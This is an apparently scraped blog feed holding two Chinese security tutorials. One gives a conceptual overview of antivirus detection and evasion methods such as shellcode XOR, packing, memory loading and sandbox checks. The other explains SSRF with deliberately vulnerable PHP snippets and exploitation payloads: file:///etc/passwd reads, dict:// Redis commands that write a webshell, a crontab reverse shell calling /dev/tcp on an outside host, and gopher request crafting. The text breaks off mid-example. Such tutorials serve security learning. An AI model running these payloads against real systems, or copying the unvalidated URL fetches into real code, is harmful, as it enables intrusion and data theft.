    <content type="html"><![CDATA[<p><strong>免杀技术从入门到入土（一）基础篇</strong></p><p>主要聚焦在了解基本概念和现存的查杀方法，进一步了解目前免杀的主要手段。</p><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>为什么要开这么一个系列的文章呢？</p><p>主要还是想让自己多会一点东西，自己主攻渗透测试方面，又不打算向代码审计和安全开发深入，所以免杀可能是最符合我的方向。除了这些原因以外，可能还是因为之前自己打靶场，开了个 360 把自己杀破防了的缘故吧~（气死我了！！！！）</p><p>再者，免杀作为渗透测试里面的终极技术（如果你马都传不上去，或者说马都跑不起来，那你再厉害，不了埋没了吗？），早点接触可能对后续的学习也有很大的帮助吧。</p><p>就让我来看看这个被称为渗透测试中的“压轴题”的含金量吧！</p><p>免杀，启动！</p><h1 id="二、基础概念"><a href="#二、基础概念" class="headerlink" title="二、基础概念"></a>二、基础概念</h1><p><strong>免杀</strong>，也就是反病毒（AntiVirus）与反间谍（AntiSpyware）的对⽴立⾯面，英⽂文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。</p><p><strong>远控免杀</strong>是指通过某些技术手段，使得远程控制工具或恶意软件避免被传统的杀毒软件、IDS（入侵检测系统）、IPS（入侵防御系统）等安全防护系统识别出来。  </p><h1 id="三、杀软"><a href="#三、杀软" class="headerlink" title="三、杀软"></a>三、杀软</h1><h2 id="3-1-杀软的分类"><a href="#3-1-杀软的分类" class="headerlink" title="3.1 杀软的分类"></a>3.1 杀软的分类</h2><ol><li><font style="color:rgb(63, 63, 63);">免费版，对所有用户开放，例如：360安全卫士、360杀毒、火绒、电脑管家等等</font></li><li><font style="color:rgb(63, 63, 63);">企业版，也是收费版，我们把他称为EDR，对比免费版，查杀更加严格，特别是针对于内存的查杀，比如：卡巴斯基、ESET(NOD32)等等</font></li></ol><h2 id="3-2-杀软的检测方式"><a href="#3-2-杀软的检测方式" class="headerlink" title="3.2 杀软的检测方式"></a><font style="color:rgb(63, 63, 63);">3.2 杀软的检测方式</font></h2><ul><li><strong>扫描技术</strong></li></ul><ol><li><font style="color:rgb(63, 63, 63);">扫描压缩包技术；对压缩文件进行分析检查的技术</font></li><li><font style="color:rgb(63, 63, 63);">程序防窜改防护；保护程序避免被恶意程序修改</font></li><li><font style="color:rgb(63, 63, 63);">修复技术；对恶意程序所破坏的文件还原</font></li><li><font style="color:rgb(63, 63, 63);">智能扫描；扫描常用磁盘，系统关键位置，时间短</font></li><li><font style="color:rgb(63, 63, 63);">全盘扫描；扫描电脑全盘文件，时间长</font></li><li><font style="color:rgb(63, 63, 63);">勒索软件防护；保护电脑不受勒索软件的攻击</font></li><li><font style="color:rgb(63, 63, 63);">开机扫描；电脑开机时自动扫描，可以扫描压缩文档和不需要的程序</font></li></ol><ul><li><strong>监控技术</strong></li></ul><ol><li><font style="color:rgb(63, 63, 63);">内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存的网络数据。</font></li><li><font style="color:rgb(63, 63, 63);">文件监控：当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警</font></li><li><font style="color:rgb(63, 63, 63);">邮件监控：当发现电子邮件的附件存在病毒时进行拦截。office钓鱼 宏病毒 这种</font></li><li><font style="color:rgb(63, 63, 63);">网页防护：阻止网络攻击和不安全下载。 mshta js脚本</font></li><li><font style="color:rgb(63, 63, 63);">行为防护：提醒用户可疑的应用程序行为。低危 和中</font></li></ol><ul><li><strong>云查杀</strong><font style="color:rgb(63, 63, 63);">（实质就是病毒库由客户端移至服务端，一般分为两种情况，例如360）</font></li></ul><ol><li><font style="color:rgb(63, 63, 63);">客户端提取特征上传，在云端检测到对应特征所标明的是否病毒状态，并返回</font></li><li><font style="color:rgb(63, 63, 63);">客户端上传特征，在云端无法检测到，则上传文件，文件通过杀软系统进行评判，得出总评分，对于无结果的，进行鉴定系统评分，总共得出结果返回给用户，并入云端库</font></li><li><font style="color:rgb(63, 63, 63);">云查杀的特点基本也可以概括为特征查杀。</font></li></ol><h1 id="四、扫描引擎"><a href="#四、扫描引擎" class="headerlink" title="四、扫描引擎"></a><font style="color:rgb(63, 63, 63);">四、扫描引擎</font></h1><h2 id="4-1-特征码扫描"><a href="#4-1-特征码扫描" class="headerlink" title="4.1 特征码扫描"></a>4.1 特征码扫描</h2><p><font style="color:rgb(63, 63, 63);">将扫描信息与病毒数据库进行对比，病毒库是一直更新的，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。</font></p><p><font style="color:rgb(63, 63, 63);">杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做</font><strong><font style="color:rgb(63, 63, 63);">病毒的特征码</font></strong><font style="color:rgb(63, 63, 63);">；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。</font></p><h2 id="4-2-特征码识别"><a href="#4-2-特征码识别" class="headerlink" title="4.2 特征码识别"></a>4.2 特征码识别</h2><ol><li><font style="color:rgb(63, 63, 63);">文件特征码：对付病毒在文件中的存在方式：单一文件特征码、复合文件特征码（通过多处特征进行判断）；</font></li><li><font style="color:rgb(63, 63, 63);">内存特征码：对付病毒在内存中的存在方式：单一内存特征码、复合内存特征码优点：速度快，配备高性能的扫描引擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。</font></li></ol><h2 id="4-3-文件校验和"><a href="#4-3-文件校验和" class="headerlink" title="4.3 文件校验和"></a>4.3 文件校验和</h2><p><font style="color:rgb(63, 63, 63);">对文件进行扫描后，可以将正常文件的内容，计算其校验和，将该校验和写入文件中或写入别的文件中保存；在文件使用过程中，定期地或每次使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，因而可以发现文件是否感染病毒。</font></p><h2 id="4-4-进程行为检测（沙盒模式）VT"><a href="#4-4-进程行为检测（沙盒模式）VT" class="headerlink" title="4.4 进程行为检测（沙盒模式）VT"></a>4.4 进程行为检测（沙盒模式）VT</h2><p><font style="color:rgb(63, 63, 63);">行为检测通过hook关键api，以及对各个高危的文件、组件做监控防止恶意程序对系统修改。只要恶意程序对注册表、启动项、系统文件等做操作就会触发告警。最后，行为检测也被应用到了沙箱做为动态检测，对于避免沙箱检测的办法有如下几个：</font></p><ul><li><font style="color:rgb(63, 63, 63);">延时执行，部分沙箱存在运行时间限制</font></li><li><font style="color:rgb(63, 63, 63);">沙箱检测，对诸如硬盘容量、内存、虚拟机特征做检测</font></li><li><font style="color:rgb(63, 63, 63);">部分沙箱会对文件重命名，可以检测自身文件名是否被更改</font></li></ul><h2 id="4-5-主动防御"><a href="#4-5-主动防御" class="headerlink" title="4.5 主动防御"></a>4.5 主动防御</h2><p><font style="color:rgb(63, 63, 63);">主动防御并不需要病毒特征码支持，只要杀毒软件能分析并扫描到目标程序的行为，并根据预先设定的规则，判定是否应该进行清除操作。参考360的主动防御</font></p><h1 id="五、常见的绕过技术"><a href="#五、常见的绕过技术" class="headerlink" title="五、常见的绕过技术"></a><font style="color:rgb(63, 63, 63);">五、常见的绕过技术</font></h1><h2 id="5-1-特征码免杀"><a href="#5-1-特征码免杀" class="headerlink" title="5.1 特征码免杀"></a>5.1 特征码免杀</h2><p><font style="color:rgb(63, 63, 63);">一个加载器存在两个明显的特征：</font></p><p><font style="color:rgb(63, 63, 63);">一个是shellcode和硬编码字符串。我们需要消除这些特征，比较方便使用一个简单的异或加密就能消除shellcode的特征。</font></p><p><font style="color:rgb(63, 63, 63);">第二个是加载器的关联特征也需要消除，通过加入无意义的代码干扰反病毒引擎。</font></p><h2 id="5-2-花指令免杀"><a href="#5-2-花指令免杀" class="headerlink" title="5.2 花指令免杀"></a>5.2 花指令免杀</h2><p><font style="color:rgb(63, 63, 63);">花指令其实就是一段毫无意义的指令，也可以称之为</font><strong><font style="color:rgb(63, 63, 63);">垃圾指令</font></strong><font style="color:rgb(63, 63, 63);">。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。</font></p><h2 id="5-3-加壳免杀"><a href="#5-3-加壳免杀" class="headerlink" title="5.3 加壳免杀"></a>5.3 加壳免杀</h2><p><font style="color:rgb(63, 63, 63);">简单地说，</font><strong><font style="color:rgb(63, 63, 63);">软件加壳</font></strong><font style="color:rgb(63, 63, 63);">其实也可以称为</font><strong><font style="color:rgb(63, 63, 63);">软件加密（或软件压缩）</font></strong><font style="color:rgb(63, 63, 63);">，只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。加壳虽然对于特征码绕过有非常好的效果，加密壳基本上可以把特征码全部掩盖，但是缺点也非常的明显，因为壳自己也有特征，主流的壳如VMP, Themida等等。</font></p><h2 id="5-4-内存免杀"><a href="#5-4-内存免杀" class="headerlink" title="5.4 内存免杀"></a>5.4 内存免杀</h2><p><font style="color:rgb(63, 63, 63);">shellcode直接加载进内存，避免文件落地，可以绕过文件扫描，但是针对内存的扫描还需对shellcode特征做隐藏处理。对windows来说，新下载的文件和从外部来的文件，都会被windows打上标记，会被优先重点扫描。然而，无文件落地可以规避这一策略。同时申请内存的时候采用渐进式申请，申请一块可读写内存，再在运行改为可执行。最后，在执行时也要执行分离免杀的策略。</font></p><h2 id="5-5-分离免杀"><a href="#5-5-分离免杀" class="headerlink" title="5.5 分离免杀"></a>5.5 分离免杀</h2><p><font style="color:rgb(63, 63, 63);">即ShellCode和加载器分离。各种语言实现的都很容易找到，虽然看起来比较简单，但效果却是不错的。比如可以远程读取png中的shellcode。</font></p><h2 id="5-6-资源修改"><a href="#5-6-资源修改" class="headerlink" title="5.6 资源修改"></a>5.6 资源修改</h2><p><font style="color:rgb(63, 63, 63);">杀软在检测程序的时候会对诸如文件的描述、版本号、创建日期作为特征检测，可用restorator对目标修改资源文件。比如：加资源、替换资源、加签名等等</font></p><h2 id="5-7-白名单免杀"><a href="#5-7-白名单免杀" class="headerlink" title="5.7 白名单免杀"></a>5.7 白名单免杀</h2><p><font style="color:rgb(63, 63, 63);">利用一些系统自带的白程序加载payload，例如powershell、mshta等等…</font></p><h1 id="六、常见杀软"><a href="#六、常见杀软" class="headerlink" title="六、常见杀软"></a>六、常见杀软</h1><p><strong>常用命令：</strong>tasklist &#x2F;SVG</p><h2 id="6-1-常见杀软"><a href="#6-1-常见杀软" class="headerlink" title="6.1 常见杀软"></a>6.1 常见杀软</h2><ul><li><strong>国内杀软</strong></li></ul><p>360 全家桶、腾讯管家、火绒安全软件、安全狗、金山毒霸、电脑管家、瑞星等等……</p><ul><li><strong>国外杀软</strong></li></ul><p>卡巴斯基、AVAST、AVG、科摩多、火眼、诺顿、nod32、小红伞等等</p><h2 id="6-2-杀软进程"><a href="#6-2-杀软进程" class="headerlink" title="6.2 杀软进程"></a>6.2 杀软进程</h2><ul><li><strong>360 全家桶：</strong>360tray.exe、360safe.exe、360ZhuDongFangYu.exe、360sd.exe</li><li><strong>火绒：</strong><font style="color:rgb(63, 63, 63);">hipstray.exe、wsctrl.exe、usysdiag.exe</font></li><li><strong><font style="color:rgb(63, 63, 63);">安全狗：</font></strong><font style="color:rgb(63, 63, 63);">SafeDogGuarsdCenter.exe、safedogupdatecenter.exe、safedogguardcenter.exe</font></li><li><strong><font style="color:rgb(63, 63, 63);">瑞星：</font></strong><font style="color:rgb(63, 63, 63);">rstray.exe、ravmond.exe、rsmain.exe</font></li><li><strong><font style="color:rgb(63, 63, 63);">卡巴斯基：</font></strong><font style="color:rgb(63, 63, 63);">AVP.EXE</font></li><li><strong><font style="color:rgb(63, 63, 63);">小红伞：</font></strong><font style="color:rgb(63, 63, 63);">avfwsvc.exe、avgnt.exe、avguard.exe、avmailc.exe、avshadow.exe</font></li><li><strong><font style="color:rgb(63, 63, 63);">nod32：</font></strong><font style="color:rgb(63, 63, 63);">egui.exe、eguiProxy.exe、ekrn.exe</font></li></ul><p><font style="color:rgb(63, 63, 63);"></font></p><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a><font style="color:rgb(63, 63, 63);">七、总结</font></h1><p>在本章节我们主要是总结了一下在免杀中可能首先需要知道和了解的一些概念，包括免杀的定义、绕过方式、检测方式等等</p><ol><li>检测方式主要还是围绕病毒的特征进行检测，无论是从文件本身还是对内存数据检测，能够发现病毒的特征就是检测病毒的关键；</li><li>免杀绕过即使想方设法去避免被杀软检测到病毒特征，因此需要尽可能的隐藏病毒特征，通过编码或者重写特征等方式实现，包括但不限于修改特征码、花指令、加壳、内存加载、分离、资源修改、白名单等等；</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.sec-in.com/article/1598">https://www.sec-in.com/article/1598</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>免杀对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀对抗</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web漏洞之SSRF</title>
    <link href="/2025/02/20/web%E6%BC%8F%E6%B4%9E%E4%B9%8BSSRF/"/>
    <url>/2025/02/20/web%E6%BC%8F%E6%B4%9E%E4%B9%8BSSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><p><strong>服务端请求伪造(SSRF)<strong>是一种攻击者通过构造恶意请求，</strong>诱导服务器向非预期目标发起网络请求</strong>的安全漏洞。攻击者利用存在漏洞的服务器作为代理，绕过访问限制，访问内部资源或第三方系统，可能导致敏感信息泄露、内网探测、甚至远程代码执行。</p><p>攻击目标：一般是外网无法直接访问的内部系统。</p><h1 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h1><h2 id="2-1-漏洞原因"><a href="#2-1-漏洞原因" class="headerlink" title="2.1 漏洞原因"></a>2.1 漏洞原因</h2><ol><li><strong>用户可控数据</strong>：应用程序接收用户提供的 url 或域名（例如图片下载、API 调用、网页预览功能）。</li><li><strong>服务器发起请求</strong>：服务器未严格校验用户数据，直接向该 url 发起 HTTP、FTP、Gopher 等协议请求。</li><li><strong>访问非授权资源</strong>：攻击者通过篡改数据，使服务器访问内网服务（如数据库、管理后台）、本地文件（<code>file://</code>协议）或云元数据接口（如 AWS&#x2F;Aliyun 的元数据服务）。</li></ol><h2 id="2-2-漏洞攻击场景"><a href="#2-2-漏洞攻击场景" class="headerlink" title="2.2 漏洞攻击场景"></a>2.2 漏洞攻击场景</h2><ol><li><strong>内网探测</strong>：扫描内网IP和端口，识别存活服务（如Redis、MySQL）。</li><li><strong>敏感信息泄露</strong>：访问云服务器元数据（如<code>http://169.254.169.254/</code>获取临时密钥）。</li><li><strong>协议滥用</strong>：<ul><li>使用<code>file://</code>协议读取服务器本地文件（如<code>file:///etc/passwd</code>）。</li><li>利用<code>gopher://</code>协议构造任意TCP流量攻击内网服务（如Redis未授权访问）。</li></ul></li><li><strong>绕过防御</strong>：通过服务器IP绕过IP白名单限制或身份认证。</li></ol><h1 id="三、漏洞产生"><a href="#三、漏洞产生" class="headerlink" title="三、漏洞产生"></a>三、漏洞产生</h1><p>漏洞产生的相关函数</p><ol><li>file_get_contents()</li><li>fsockopen()</li><li>curl_exec()</li><li>fopen()</li><li>readfile()</li></ol><h2 id="3-1-file-get-contents"><a href="#3-1-file-get-contents" class="headerlink" title="3.1 file_get_contents()"></a>3.1 file_get_contents()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>**file_get_content**</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p></blockquote><h2 id="3-2-fsockopen"><a href="#3-2-fsockopen" class="headerlink" title="3.2 fsockopen()"></a>3.2 fsockopen()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>**fsockopen**</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p></blockquote><h2 id="3-3-curl-exec"><a href="#3-3-curl-exec" class="headerlink" title="3.3 curl_exec()"></a>3.3 curl_exec()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">// 创建新的 cURL 资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<span class="hljs-comment">// 设置 URL 和相应的选项</span><br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<span class="hljs-comment">// 抓取 URL 并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<span class="hljs-comment">// 关闭 cURL 资源，并且释放系统资源</span><br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>**curl_exec**</code>函数用于执行指定的cURL会话</p></blockquote><h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><h2 id="4-1-ssrf-端口探测"><a href="#4-1-ssrf-端口探测" class="headerlink" title="4.1 ssrf 端口探测"></a>4.1 ssrf 端口探测</h2><ul><li>http 协议探测</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=http://127.0.0.1:6379<br></code></pre></td></tr></table></figure><ul><li>dict 协议探测</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=dict://127.0.0.1:6379<br></code></pre></td></tr></table></figure><h2 id="4-2-ssrf-任意文件读取"><a href="#4-2-ssrf-任意文件读取" class="headerlink" title="4.2 ssrf 任意文件读取"></a>4.2 ssrf 任意文件读取</h2><ul><li>file 协议读取任意文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=file:///etc/passwd<br></code></pre></td></tr></table></figure><h2 id="4-3-dict-协议利用"><a href="#4-3-dict-协议利用" class="headerlink" title="4.3 dict 协议利用"></a>4.3 dict 协议利用</h2><h3 id="4-3-1-dict-协议读取-redis-版本信息"><a href="#4-3-1-dict-协议读取-redis-版本信息" class="headerlink" title="4.3.1 dict 协议读取 redis 版本信息"></a>4.3.1 dict 协议读取 redis 版本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=dict://127.0.0.1:6379/info<br></code></pre></td></tr></table></figure><h3 id="4-3-2-dict-协议利用-redis-写文件"><a href="#4-3-2-dict-协议利用-redis-写文件" class="headerlink" title="4.3.2 dict 协议利用 redis 写文件"></a>4.3.2 dict 协议利用 redis 写文件</h3><p>以下方法可以实现修改文件内容、新建文件写入内容；</p><ol><li>通过<code>info</code>探测是否设置口令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/info<br></code></pre></td></tr></table></figure><p>出现类似<code>NOAUTH Authentication required</code>等字样就是设置有口令，可以通过弱口令爆破进行认证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/auth:$123456$<br></code></pre></td></tr></table></figure><ol start="2"><li>更改 rdb 文件的目录至需要写文件的目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/config:set:dir:/var/www/html<br></code></pre></td></tr></table></figure><ol start="3"><li>将 rdb 文件名 dbfilename 修改为写入的文件名 webshell.php</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/config:set:dbfilename:webshell.php<br></code></pre></td></tr></table></figure><ol start="4"><li>写入内容到<code>dbfilename</code>中，如果内容存在过滤或者转义，可以利用 16 进制内容写入</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/config:set:webshell.php:&lt;?php phpinfo();?&gt;<br></code></pre></td></tr></table></figure><ol start="5"><li>保存写入的内容</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6380/save<br></code></pre></td></tr></table></figure><h3 id="4-3-3-dict-配置定时任务反弹-shell"><a href="#4-3-3-dict-配置定时任务反弹-shell" class="headerlink" title="4.3.3 dict 配置定时任务反弹 shell"></a>4.3.3 dict 配置定时任务反弹 shell</h3><p>要求系统存在<code>cron</code>，且知道其相应的配置文件，假设配置文件为<code>/etc/crontab</code>，与上述写文件相似，将定时任务写到<code>/etc/crontab</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/flushall<br>?url=dict://127.0.0.1:6379/auth:123456<br>?url=dict://127.0.0.1:6379/config:set:dir:/etc/<br>?url=dict://127.0.0.1:6379/config:set:dbfilename:crontab<br>?url=dict://127.0.0.1:6379/config:set:crontab:\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xxx.xx/4444 0&gt;&amp;1\n\n<br>?url=dict://127.0.0.1:6379/save<br></code></pre></td></tr></table></figure><h2 id="4-4-gopher-协议利用"><a href="#4-4-gopher-协议利用" class="headerlink" title="4.4 gopher 协议利用"></a>4.4 gopher 协议利用</h2><p>相关工具和资料</p><ol><li><a href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools&#x2F;tree&#x2F;master</a></li><li><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></li><li><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></li></ol><h3 id="4-4-1-gopher-发送-GET-数据包"><a href="#4-4-1-gopher-发送-GET-数据包" class="headerlink" title="4.4.1 gopher 发送 GET 数据包"></a>4.4.1 gopher 发送 GET 数据包</h3><p>通过gopher发送get请求，请求数据包内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /b.php?q=1 HTTP/1.1 <br>Host: 192.168.47.244<br></code></pre></td></tr></table></figure><p>gopher发送get请求方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">//url编码前的内容<br>gopher://192.168.47.244:80/_GET /b.php?q=1 HTTP/1.1 <br>Host: 192.168.47.244<br>//url编码后的内容<br>gopher://192.168.47.244:80/_GET%20/b.php%3Fq%3D1%20HTTP/1.1%0D%0AHost%3A%20192.168.47.244%0D%0A%0D%0A<br></code></pre></td></tr></table></figure><h3 id="4-4-2-gopher-发送-POST-数据包"><a href="#4-4-2-gopher-发送-POST-数据包" class="headerlink" title="4.4.2 gopher 发送 POST 数据包"></a>4.4.2 gopher 发送 POST 数据包</h3><p>通过gopher发送post请求，请求数据包内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /b.php?q=1 HTTP/1.1<br>Host: 192.168.47.244<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 8<br><br>q=Myname<br></code></pre></td></tr></table></figure><p>gopher发送post请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">//url编码前的内容<br>gopher://192.168.47.244:80/_POST 